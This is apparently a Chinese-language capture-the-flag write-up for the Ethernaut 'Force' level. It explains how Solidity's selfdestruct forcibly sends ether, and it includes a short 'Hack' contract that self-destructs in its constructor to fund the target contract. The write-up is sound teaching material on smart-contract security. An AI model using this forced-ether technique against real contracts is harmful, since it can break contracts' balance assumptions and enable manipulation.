# Force
## 題目
<img width="532" alt="截圖 2024-09-05 下午5 33 22" src="https://github.com/user-attachments/assets/fbb52232-c49f-47ec-b801-a5e27de612de">

目標是讓關卡合約的 balance 大於 0 即可通關。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
喵喵(x)，看到這個合約可能會想說這三小完全就是空的，但我們可以利用 `selfdestruct` 來解題。

## selfdestruct

`selfdestruct` 是用來刪除合約的，並將該合約中剩餘的所有以太幣轉移到指定地址。所以，我們可以利用這個特性，將一個攻擊合約中的以太幣透過 `selfdestruct` 強制轉移到 `Force` 合約中。

### 用法

`selfdestruct` 的語法如下：
```solidity
selfdestruct(address payable recipient);
```

- `recipient`: 銷毀合約後，以太幣會轉移到這個地址，無論該地址是外部帳戶 (EOA) 還是另一個合約地址。
  
當 `selfdestruct` 被調用後：
1. 合約將被永久銷毀，這意味著該合約的程式碼不再存在於區塊鏈上。
2. 合約中的所有剩餘以太幣將被強制轉移到 `recipient` 地址。
3. 該合約在未來也無法再被使用或調用，因為它的程式碼已被清除。

## hack
```solidity
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}

contract Hack {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
```
